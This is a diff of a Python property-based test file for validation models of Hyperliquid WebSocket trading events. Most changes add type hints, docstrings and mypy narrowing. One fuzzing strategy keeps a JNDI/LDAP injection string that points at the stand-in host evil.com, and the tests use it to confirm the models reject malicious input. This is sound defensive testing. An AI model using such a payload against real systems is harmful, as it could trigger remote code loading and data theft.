@@ -1,7 +1,7 @@
 """Property-based tests for Hyperliquid raw WebSocket event models.
 
 These tests validate critical security boundary models that process external WebSocket event data.
-The models tested here are essential for real-time trading, order book updates, trade events, and user state changes.
+The models tested here are essential for real-time trading and order book updates.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious WebSocket event data that could manipulate real-time trading decisions
@@ -14,13 +14,13 @@ SECURITY CRITICAL: These raw models protect against:
 - Order ID manipulation that could affect order tracking
 - Boolean manipulation that could affect maker/taker status
 
-Property testing ensures comprehensive coverage of WebSocket event edge cases and adversarial inputs.
+Property testing ensures comprehensive coverage of WebSocket event edge cases.
 """
 
 import string
 from datetime import UTC, datetime
 from decimal import Decimal
-from typing import Any
+from typing import cast
 
 import pytest
 from hypothesis import assume, given, strategies as st
@@ -41,13 +41,38 @@ from cyberdelta.exceptions.parsing import EmptyStringError
 from tests.fixtures.time_fixtures import FreezerProtocol
 
 
+# Type alias for malicious input types to avoid long lines
+MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None
+
+
+# =============================================================================
+# HELPER FUNCTIONS
+# =============================================================================
+
+
+def _create_hex_address(hex_part: str) -> str:
+    """Create hexadecimal address with 0x prefix.
+
+    Args:
+        hex_part: Hexadecimal string part
+
+    Returns:
+        Address string with 0x prefix
+    """
+    return f"0x{hex_part}"
+
+
 # =============================================================================
 # HYPOTHESIS STRATEGIES FOR WEBSOCKET EVENTS MODEL TESTING
 # =============================================================================
 
 
 def valid_coin_symbol_strategy() -> SearchStrategy[str]:
-    """Generate valid coin symbols for WebSocket events."""
+    """Generate valid coin symbols for WebSocket events.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Known trading pairs
         st.sampled_from([
@@ -79,12 +104,20 @@ def valid_coin_symbol_strategy() -> SearchStrategy[str]:
 
 
 def valid_side_strategy() -> SearchStrategy[str]:
-    """Generate valid trading sides."""
+    """Generate valid trading sides.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.sampled_from(["A", "B"])  # A = Ask (Sell), B = Bid (Buy)
 
 
 def invalid_side_strategy() -> SearchStrategy[str]:
-    """Generate invalid trading sides."""
+    """Generate invalid trading sides.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.sampled_from(["a", "b", "ask", "bid", "sell", "buy", "S", "X", "0", "1"]),
         st.text(min_size=1, max_size=20).filter(lambda x: x not in ["A", "B"]),
@@ -94,7 +127,11 @@ def invalid_side_strategy() -> SearchStrategy[str]:
 
 
 def financial_decimal_string_strategy() -> SearchStrategy[str]:
-    """Generate valid decimal strings for financial amounts."""
+    """Generate valid decimal strings for financial amounts.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Common trading values
         st.decimals(
@@ -120,7 +157,11 @@ def financial_decimal_string_strategy() -> SearchStrategy[str]:
 
 
 def invalid_decimal_string_strategy() -> SearchStrategy[str]:
-    """Generate invalid decimal strings."""
+    """Generate invalid decimal strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Non-finite values
         st.just("NaN"),
@@ -137,7 +178,11 @@ def invalid_decimal_string_strategy() -> SearchStrategy[str]:
 
 
 def valid_ethereum_address_strategy() -> SearchStrategy[str]:
-    """Generate valid Ethereum addresses."""
+    """Generate valid Ethereum addresses.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Known valid addresses
         st.sampled_from([
@@ -148,14 +193,18 @@ def valid_ethereum_address_strategy() -> SearchStrategy[str]:
         ]),
         # Generated valid addresses
         st.builds(
-            lambda hex_part: f"0x{hex_part}",
+            _create_hex_address,
             st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
         ),
     ])
 
 
 def valid_cloid_strategy() -> SearchStrategy[str]:
-    """Generate valid client order IDs (128-bit hex strings)."""
+    """Generate valid client order IDs (128-bit hex strings).
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Known valid CLOIDs
         st.sampled_from([
@@ -166,14 +215,18 @@ def valid_cloid_strategy() -> SearchStrategy[str]:
         ]),
         # Generated valid CLOIDs (128-bit = 32 hex chars)
         st.builds(
-            lambda hex_part: f"0x{hex_part}",
+            _create_hex_address,
             st.text(min_size=32, max_size=32, alphabet=string.hexdigits),
         ),
     ])
 
 
 def invalid_cloid_strategy() -> SearchStrategy[str]:
-    """Generate invalid client order IDs."""
+    """Generate invalid client order IDs.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Wrong length
         st.text(min_size=1, max_size=31, alphabet=string.hexdigits),
@@ -182,7 +235,7 @@ def invalid_cloid_strategy() -> SearchStrategy[str]:
         st.text(min_size=32, max_size=32, alphabet=string.hexdigits),
         # Invalid characters
         st.builds(
-            lambda hex_part: f"0x{hex_part}",
+            _create_hex_address,
             st.text(
                 min_size=32,
                 max_size=32,
@@ -196,7 +249,11 @@ def invalid_cloid_strategy() -> SearchStrategy[str]:
 
 
 def valid_timestamp_strategy() -> SearchStrategy[int]:
-    """Generate valid timestamps (milliseconds since epoch)."""
+    """Generate valid timestamps (milliseconds since epoch).
+
+    Returns:
+        SearchStrategy[int]: Strategy for generating test data.
+    """
     return st.integers(
         min_value=1000000000000,  # 2001-09-09
         max_value=2000000000000,  # 2033-05-18
@@ -204,7 +261,11 @@ def valid_timestamp_strategy() -> SearchStrategy[int]:
 
 
 def invalid_timestamp_strategy() -> SearchStrategy[int]:
-    """Generate invalid timestamps."""
+    """Generate invalid timestamps.
+
+    Returns:
+        SearchStrategy[int]: Strategy for generating test data.
+    """
     return st.one_of([
         st.integers(min_value=-1000000, max_value=-1),  # Negative timestamps
         st.integers(min_value=0, max_value=999999999),  # Too small (seconds, not milliseconds)
@@ -213,7 +274,11 @@ def invalid_timestamp_strategy() -> SearchStrategy[int]:
 
 
 def valid_hash_strategy() -> SearchStrategy[str]:
-    """Generate valid hash strings."""
+    """Generate valid hash strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.text(min_size=1, max_size=64, alphabet=string.hexdigits),
         st.just("abc123"),
@@ -223,18 +288,30 @@ def valid_hash_strategy() -> SearchStrategy[str]:
 
 
 def valid_order_id_strategy() -> SearchStrategy[int]:
-    """Generate valid order IDs."""
+    """Generate valid order IDs.
+
+    Returns:
+        SearchStrategy[int]: Strategy for generating test data.
+    """
     return st.integers(min_value=1, max_value=9999999999)
 
 
 def valid_trade_id_strategy() -> SearchStrategy[int]:
-    """Generate valid trade IDs."""
+    """Generate valid trade IDs.
+
+    Returns:
+        SearchStrategy[int]: Strategy for generating test data.
+    """
     return st.integers(min_value=1, max_value=9999999999)
 
 
 @st.composite
-def valid_book_level_strategy(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid order book level data."""
+def valid_book_level_strategy(draw: st.DrawFn) -> dict[str, str | int]:
+    """Generate valid order book level data.
+
+    Returns:
+        dict[str, str | int]: Generated test data.
+    """
     return {
         "px": draw(financial_decimal_string_strategy()),
         "sz": draw(financial_decimal_string_strategy()),
@@ -243,16 +320,26 @@ def valid_book_level_strategy(draw: st.DrawFn) -> dict[str, Any]:
 
 
 @st.composite
-def valid_book_levels_strategy(draw: st.DrawFn) -> list[list[dict[str, Any]]]:
-    """Generate valid book levels (bids and asks)."""
+def valid_book_levels_strategy(draw: st.DrawFn) -> list[list[dict[str, str | int]]]:
+    """Generate valid book levels (bids and asks).
+
+    Returns:
+        list[list[dict[str, str | int]]]: Generated test data.
+    """
     bids = draw(st.lists(valid_book_level_strategy(), min_size=0, max_size=10))
     asks = draw(st.lists(valid_book_level_strategy(), min_size=0, max_size=10))
     return [bids, asks]
 
 
 @st.composite
-def valid_position_info_strategy(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid position info data."""
+def valid_position_info_strategy(
+    draw: st.DrawFn,
+) -> dict[str, str | dict[str, str | int] | int | None]:
+    """Generate valid position info data.
+
+    Returns:
+        dict[str, str | dict[str, str | int] | int | None]: Generated test data.
+    """
     return {
         "coin": draw(valid_coin_symbol_strategy()),
         "entryPx": draw(st.one_of([financial_decimal_string_strategy(), st.none()])),
@@ -271,8 +358,12 @@ def valid_position_info_strategy(draw: st.DrawFn) -> dict[str, Any]:
 
 
 @st.composite
-def valid_fill_event_strategy(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid WebSocket fill event data."""
+def valid_fill_event_strategy(draw: st.DrawFn) -> dict[str, str | int | bool | None]:
+    """Generate valid WebSocket fill event data.
+
+    Returns:
+        dict[str, str | int | bool | None]: Generated test data.
+    """
     return {
         "coin": draw(valid_coin_symbol_strategy()),
         "px": draw(financial_decimal_string_strategy()),
@@ -287,8 +378,14 @@ def valid_fill_event_strategy(draw: st.DrawFn) -> dict[str, Any]:
 
 
 @st.composite
-def valid_book_update_strategy(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid WebSocket book update data."""
+def valid_book_update_strategy(
+    draw: st.DrawFn,
+) -> dict[str, str | int | list[list[dict[str, str | int]]]]:
+    """Generate valid WebSocket book update data.
+
+    Returns:
+        dict[str, str | int | list[list[dict[str, str | int]]]]: Generated test data.
+    """
     return {
         "coin": draw(valid_coin_symbol_strategy()),
         "levels": draw(valid_book_levels_strategy()),
@@ -297,8 +394,12 @@ def valid_book_update_strategy(draw: st.DrawFn) -> dict[str, Any]:
 
 
 @st.composite
-def valid_trade_event_strategy(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid WebSocket trade event data."""
+def valid_trade_event_strategy(draw: st.DrawFn) -> dict[str, str | int | list[str]]:
+    """Generate valid WebSocket trade event data.
+
+    Returns:
+        dict[str, str | int | list[str]]: Generated test data.
+    """
     return {
         "coin": draw(valid_coin_symbol_strategy()),
         "px": draw(financial_decimal_string_strategy()),
@@ -312,8 +413,12 @@ def valid_trade_event_strategy(draw: st.DrawFn) -> dict[str, Any]:
 
 
 @st.composite
-def valid_order_update_strategy(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid WebSocket order update data."""
+def valid_order_update_strategy(draw: st.DrawFn) -> dict[str, object]:
+    """Generate valid WebSocket order update data.
+
+    Returns:
+        dict[str, object]: Generated test data.
+    """
     return {
         "eventType": draw(st.text(min_size=1, max_size=50)),
         "data": draw(
@@ -328,8 +433,14 @@ def valid_order_update_strategy(draw: st.DrawFn) -> dict[str, Any]:
 
 
 @st.composite
-def valid_position_update_event_strategy(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid WebSocket position update event data."""
+def valid_position_update_event_strategy(
+    draw: st.DrawFn,
+) -> dict[str, str | int | dict[str, str | dict[str, str | int] | int | None]]:
+    """Generate valid WebSocket position update event data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "asset": draw(valid_coin_symbol_strategy()),
         "position": draw(valid_position_info_strategy()),
@@ -337,8 +448,12 @@ def valid_position_update_event_strategy(draw: st.DrawFn) -> dict[str, Any]:
     }
 
 
-def malicious_ws_events_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for WebSocket events security testing."""
+def malicious_ws_events_strategy() -> SearchStrategy[MaliciousInput]:
+    """Generate malicious values for WebSocket events security testing.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # WebSocket event manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-ws-events}"),
@@ -390,8 +505,10 @@ class TestHyperliquidRawWsFillEventProperties:
     """Property-based tests for HyperliquidRawWsFillEvent validation and security."""
 
     @given(fill_data=valid_fill_event_strategy())
-    def test_fill_event_validation_success_properties(self, fill_data: dict[str, Any]) -> None:
-        """Property: Valid fill event data should always create valid HyperliquidRawWsFillEvent objects."""
+    def test_fill_event_validation_success_properties(
+        self, fill_data: dict[str, str | int | bool | None]
+    ) -> None:
+        """Property: Valid fill event data should create valid objects."""
         # Skip invalid data
         try:
             # Validate basic structure
@@ -404,6 +521,8 @@ class TestHyperliquidRawWsFillEventProperties:
             for field in ["px", "sz"]:
                 value = fill_data[field]
                 assume(isinstance(value, str) and value.strip())
+                # Type narrowing for mypy
+                assert isinstance(value, str)
                 decimal_val = Decimal(value)
                 assume(decimal_val.is_finite() and decimal_val > 0)
 
@@ -411,6 +530,8 @@ class TestHyperliquidRawWsFillEventProperties:
             if fill_data.get("cloid") is not None:
                 cloid = fill_data["cloid"]
                 assume(isinstance(cloid, str) and len(cloid) == 34)  # 0x + 32 hex chars
+                # Type narrowing for mypy
+                assert isinstance(cloid, str)
                 assume(cloid.startswith("0x"))
 
         except (ValueError, TypeError, KeyError, IndexError):
@@ -445,10 +566,12 @@ class TestHyperliquidRawWsFillEventProperties:
         malicious_value=malicious_ws_events_strategy(),
     )
     def test_fill_event_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self,
+        field_name: str,
+        malicious_value: MaliciousInput,
     ) -> None:
-        """Property: Fill event model should reject malicious inputs safely."""
-        base_data = {
+        """Property: Fill event model should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "coin": "ETH",
             "px": "3000.0",
             "sz": "1.5",
@@ -554,8 +677,10 @@ class TestHyperliquidRawWsBookUpdateProperties:
     """Property-based tests for HyperliquidRawWsBookUpdate validation and security."""
 
     @given(book_data=valid_book_update_strategy())
-    def test_book_update_validation_success_properties(self, book_data: dict[str, Any]) -> None:
-        """Property: Valid book update data should always create valid HyperliquidRawWsBookUpdate objects."""
+    def test_book_update_validation_success_properties(
+        self, book_data: dict[str, str | int | list[list[dict[str, str | int]]]]
+    ) -> None:
+        """Property: Valid book update data should create valid objects."""
         # Skip invalid data
         try:
             assume(isinstance(book_data["coin"], str) and book_data["coin"].strip())
@@ -563,10 +688,15 @@ class TestHyperliquidRawWsBookUpdateProperties:
             assume(isinstance(book_data["levels"], list) and len(book_data["levels"]) == 2)
 
             # Validate book levels structure
-            for side_levels in book_data["levels"]:
-                assume(isinstance(side_levels, list))
+            levels = book_data["levels"]
+            # Type narrowing for mypy
+            assert isinstance(levels, list)
+            for side_levels in levels:
+                # Type narrowing for mypy
+                assert isinstance(side_levels, list)
                 for level in side_levels:
-                    assume(isinstance(level, dict))
+                    # Type narrowing for mypy
+                    assert isinstance(level, dict)
                     for field in ["px", "sz"]:
                         if field in level:
                             value = level[field]
@@ -593,10 +723,12 @@ class TestHyperliquidRawWsBookUpdateProperties:
         malicious_value=malicious_ws_events_strategy(),
     )
     def test_book_update_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self,
+        field_name: str,
+        malicious_value: MaliciousInput,
     ) -> None:
-        """Property: Book update model should reject malicious inputs safely."""
-        base_data = {
+        """Property: Book update model should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "coin": "BTC",
             "levels": [[], []],
             "time": 1640995200000,
@@ -620,7 +752,9 @@ class TestHyperliquidRawWsBookUpdateProperties:
             st.text(),  # Wrong type
         ])
     )
-    def test_book_update_invalid_levels_structure_properties(self, levels_structure: Any) -> None:
+    def test_book_update_invalid_levels_structure_properties(
+        self, levels_structure: list[list[dict[str, str]]] | list[object] | int | str
+    ) -> None:
         """Property: Book update should reject invalid levels structure."""
         book_data = {
             "coin": "BTC",
@@ -642,8 +776,10 @@ class TestHyperliquidRawWsTradeEventProperties:
     """Property-based tests for HyperliquidRawWsTradeEvent validation and security."""
 
     @given(trade_data=valid_trade_event_strategy())
-    def test_trade_event_validation_success_properties(self, trade_data: dict[str, Any]) -> None:
-        """Property: Valid trade event data should always create valid HyperliquidRawWsTradeEvent objects."""
+    def test_trade_event_validation_success_properties(
+        self, trade_data: dict[str, str | int | list[str]]
+    ) -> None:
+        """Property: Valid trade event data should create valid objects."""
         # Skip invalid data
         try:
             assume(isinstance(trade_data["coin"], str) and trade_data["coin"].strip())
@@ -656,11 +792,16 @@ class TestHyperliquidRawWsTradeEventProperties:
             for field in ["px", "sz"]:
                 value = trade_data[field]
                 assume(isinstance(value, str) and value.strip())
+                # Type narrowing for mypy
+                assert isinstance(value, str)
                 decimal_val = Decimal(value)
                 assume(decimal_val.is_finite() and decimal_val > 0)
 
             # Validate user addresses
-            for user in trade_data["users"]:
+            users = trade_data["users"]
+            # Type narrowing for mypy
+            assert isinstance(users, list)
+            for user in users:
                 assume(isinstance(user, str) and len(user) == 42)
                 assume(user.startswith("0x"))
 
@@ -687,10 +828,12 @@ class TestHyperliquidRawWsTradeEventProperties:
         malicious_value=malicious_ws_events_strategy(),
     )
     def test_trade_event_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self,
+        field_name: str,
+        malicious_value: MaliciousInput,
     ) -> None:
-        """Property: Trade event model should reject malicious inputs safely."""
-        base_data = {
+        """Property: Trade event model should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "coin": "ETH",
             "px": "3000.0",
             "sz": "1.5",
@@ -716,8 +859,10 @@ class TestHyperliquidRawWsOrderUpdateProperties:
     """Property-based tests for HyperliquidRawWsOrderUpdate validation and security."""
 
     @given(order_data=valid_order_update_strategy())
-    def test_order_update_validation_success_properties(self, order_data: dict[str, Any]) -> None:
-        """Property: Valid order update data should always create valid HyperliquidRawWsOrderUpdate objects."""
+    def test_order_update_validation_success_properties(
+        self, order_data: dict[str, str | dict[str, str | int | bool]]
+    ) -> None:
+        """Property: Valid order update data should create valid objects."""
         # Skip invalid data
         try:
             assume(isinstance(order_data["eventType"], str) and order_data["eventType"].strip())
@@ -739,10 +884,12 @@ class TestHyperliquidRawWsOrderUpdateProperties:
         malicious_value=malicious_ws_events_strategy(),
     )
     def test_order_update_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self,
+        field_name: str,
+        malicious_value: MaliciousInput,
     ) -> None:
-        """Property: Order update model should reject malicious inputs safely."""
-        base_data = {
+        """Property: Order update model should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "eventType": "orderUpdate",
             "data": {"foo": "bar"},
         }
@@ -763,9 +910,10 @@ class TestHyperliquidRawWsPositionUpdateEventProperties:
 
     @given(position_data=valid_position_update_event_strategy())
     def test_position_update_event_validation_success_properties(
-        self, position_data: dict[str, Any]
+        self,
+        position_data: dict[str, str | int | dict[str, str | dict[str, str | int] | int | None]],
     ) -> None:
-        """Property: Valid position update data should always create valid HyperliquidRawWsPositionUpdateEvent objects."""
+        """Property: Valid position update data should create valid objects."""
         # Skip invalid data
         try:
             assume(isinstance(position_data["asset"], str) and position_data["asset"].strip())
@@ -774,6 +922,8 @@ class TestHyperliquidRawWsPositionUpdateEventProperties:
 
             # Validate position data structure
             position = position_data["position"]
+            # Type narrowing for mypy
+            assert isinstance(position, dict)
             assume(isinstance(position["coin"], str) and position["coin"].strip())
             assume(isinstance(position["leverage"], dict))
 
@@ -782,6 +932,8 @@ class TestHyperliquidRawWsPositionUpdateEventProperties:
                 if field in position:
                     value = position[field]
                     assume(isinstance(value, str) and value.strip())
+                    # Type narrowing for mypy
+                    assert isinstance(value, str)
                     decimal_val = Decimal(value)
                     assume(decimal_val.is_finite())
 
@@ -803,10 +955,12 @@ class TestHyperliquidRawWsPositionUpdateEventProperties:
         malicious_value=malicious_ws_events_strategy(),
     )
     def test_position_update_event_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self,
+        field_name: str,
+        malicious_value: MaliciousInput,
     ) -> None:
-        """Property: Position update event model should reject malicious inputs safely."""
-        base_data = {
+        """Property: Position update event model should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "asset": "ETH",
             "position": {
                 "coin": "ETH",
@@ -848,7 +1002,9 @@ class TestHyperliquidRawWsEventsIntegrationProperties:
         malicious_value=malicious_ws_events_strategy(),
     )
     def test_ws_events_batch_processing_properties(
-        self, events: list[dict[str, Any]], malicious_value: Any
+        self,
+        events: list[dict[str, str | int | bool | list[str] | dict[str, str | int | bool] | None]],
+        malicious_value: object,
     ) -> None:
         """Property: Multiple WebSocket events should be processed independently."""
         valid_events: list[
@@ -859,17 +1015,18 @@ class TestHyperliquidRawWsEventsIntegrationProperties:
             # Try to validate each event type
             try:
                 if "isMaker" in event_data:  # Fill event
-                    if self._is_valid_fill_event(event_data):
+                    if self._is_valid_fill_event(cast(dict[str, object], event_data)):
                         fill_event = HyperliquidRawWsFillEvent.model_validate(event_data)
                         valid_events.append(fill_event)
                 elif "tid" in event_data:  # Trade event
-                    if self._is_valid_trade_event(event_data):
+                    if self._is_valid_trade_event(cast(dict[str, object], event_data)):
                         trade_event = HyperliquidRawWsTradeEvent.model_validate(event_data)
                         valid_events.append(trade_event)
-                elif "eventType" in event_data:  # Order update
-                    if self._is_valid_order_update(event_data):
-                        order_event = HyperliquidRawWsOrderUpdate.model_validate(event_data)
-                        valid_events.append(order_event)
+                elif "eventType" in event_data and self._is_valid_order_update(
+                    cast(dict[str, object], event_data)
+                ):
+                    order_event = HyperliquidRawWsOrderUpdate.model_validate(event_data)
+                    valid_events.append(order_event)
             except (ValidationError, TypeError, KeyError):
                 continue
 
@@ -883,40 +1040,50 @@ class TestHyperliquidRawWsEventsIntegrationProperties:
             with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
                 HyperliquidRawWsFillEvent.model_validate(corrupted_data)
 
-    def _is_valid_fill_event(self, data: dict[str, Any]) -> bool:
-        """Check if data represents a valid fill event."""
+    def _is_valid_fill_event(self, data: dict[str, object]) -> bool:
+        """Check if data represents a valid fill event.
+
+        Returns:
+            bool: True if data represents a valid fill event, False otherwise.
+        """
         try:
             required_fields = ["coin", "px", "sz", "side", "time", "hash", "oid", "isMaker"]
             if not all(field in data for field in required_fields):
                 return False
             if data["side"] not in ["A", "B"]:
                 return False
-            if not isinstance(data["time"], int) or data["time"] <= 0:
-                return False
-            return True
+            return isinstance(data["time"], int) and data["time"] > 0
         except (TypeError, KeyError):
             return False
 
-    def _is_valid_trade_event(self, data: dict[str, Any]) -> bool:
-        """Check if data represents a valid trade event."""
+    def _is_valid_trade_event(self, data: dict[str, object]) -> bool:
+        """Check if data represents a valid trade event.
+
+        Returns:
+            bool: True if data represents a valid trade event, False otherwise.
+        """
         try:
             required_fields = ["coin", "px", "sz", "side", "time", "hash", "tid", "users"]
             if not all(field in data for field in required_fields):
                 return False
             if data["side"] not in ["A", "B"]:
                 return False
-            if not isinstance(data["users"], list) or len(data["users"]) == 0:
-                return False
-            return True
+            users = data["users"]
+            return isinstance(users, list) and len(users) > 0
         except (TypeError, KeyError):
             return False
 
-    def _is_valid_order_update(self, data: dict[str, Any]) -> bool:
-        """Check if data represents a valid order update."""
+    def _is_valid_order_update(self, data: dict[str, object]) -> bool:
+        """Check if data represents a valid order update.
+
+        Returns:
+            bool: True if data represents a valid order update, False otherwise.
+        """
         try:
             if "eventType" not in data or "data" not in data:
                 return False
-            return isinstance(data["data"], dict) and len(data["data"]) > 0
+            data_dict = data["data"]
+            return isinstance(data_dict, dict) and len(data_dict) > 0
         except (TypeError, KeyError):
             return False
 
